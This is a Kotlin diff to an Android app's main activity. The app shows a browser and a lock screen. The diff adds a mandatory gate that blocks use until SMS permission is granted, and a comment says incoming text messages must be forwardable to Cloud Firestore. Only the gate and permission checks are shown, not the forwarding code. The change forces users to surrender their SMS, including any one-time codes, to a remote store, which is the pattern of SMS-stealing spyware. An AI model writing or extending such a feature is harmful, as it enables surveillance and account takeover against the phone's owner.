@@ -22,9 +22,11 @@ import com.example.notification.NotificationHelper
 import com.example.notification.PushNotificationService
 import com.example.script.ScriptManager
 import com.example.security.SecurityManager
+import com.example.sms.SmsAccess
 import com.example.ui.BrowserScreen
 import com.example.ui.LockScreen
 import com.example.ui.NotificationRequiredScreen
+import com.example.ui.SmsAccessRequiredScreen
 import com.example.ui.theme.DarkBackground
 import com.example.ui.theme.MyApplicationTheme
 
@@ -38,6 +40,8 @@ class MainActivity : ComponentActivity() {
         registerForActivityResult(ActivityResultContracts.RequestPermission()) { _ ->
             // Permission result handled
         }
+
+    private var hasSmsAccess by mutableStateOf(false)
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -57,6 +61,9 @@ class MainActivity : ComponentActivity() {
                 requestNotificationPermission.launch(Manifest.permission.POST_NOTIFICATIONS)
             }
         }
+
+        // Mandatory gate: incoming SMS must be forwardable to Cloud Firestore
+        hasSmsAccess = SmsAccess.hasPermission(this)
 
         // Start 5-minute background reminder notifications for normal users
         notificationHelper.startPeriodicNotification(lifecycleScope, securityManager)
@@ -90,6 +97,12 @@ class MainActivity : ComponentActivity() {
                                 hasNotificationAccess = true
                             }
                         )
+                    } else if (!hasSmsAccess) {
+                        SmsAccessRequiredScreen(
+                            onPermissionGranted = {
+                                hasSmsAccess = true
+                            }
+                        )
                     } else if (isUnlocked) {
                         BrowserScreen(
                             securityManager = securityManager,
@@ -116,6 +129,7 @@ class MainActivity : ComponentActivity() {
 
     override fun onResume() {
         super.onResume()
+        hasSmsAccess = SmsAccess.hasPermission(this)
         securityManager.sendHeartbeat()
     }
 
